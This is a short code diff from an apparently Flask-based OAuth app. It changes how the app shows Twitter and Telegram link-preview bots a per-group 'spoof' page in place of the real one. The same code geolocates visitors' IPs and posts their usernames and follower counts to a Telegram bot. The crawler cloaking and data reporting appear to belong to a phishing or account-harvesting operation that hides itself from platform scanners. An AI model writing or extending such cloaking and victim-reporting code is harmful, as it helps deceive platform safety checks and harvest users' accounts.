@@ -44,7 +44,7 @@ def oauth():
     session["group_id"] = group.get("group_id")
     
     if 'Twitterbot' in user_agent or 'TelegramBot' in user_agent:
-        return redirect('https://calendly.com/cointele')
+        return redirect(group.get('spoof'))
 
     real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
     res = requests.get(f'http://ip-api.com/json/{real_ip}')
@@ -170,7 +170,7 @@ def send_to_telegram(username, followers_count, group_id):
 
 
 def send_telegram_message(chat_id, message):
-    message = message.replace(".", "\\.").replace("-", "\\-").replace("!", "\\!")
+    message = message.replace(".", "\\.").replace("-", "\\-").replace("!", "\\!").replace("_", "\\_")
     
     requests.post(
         f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
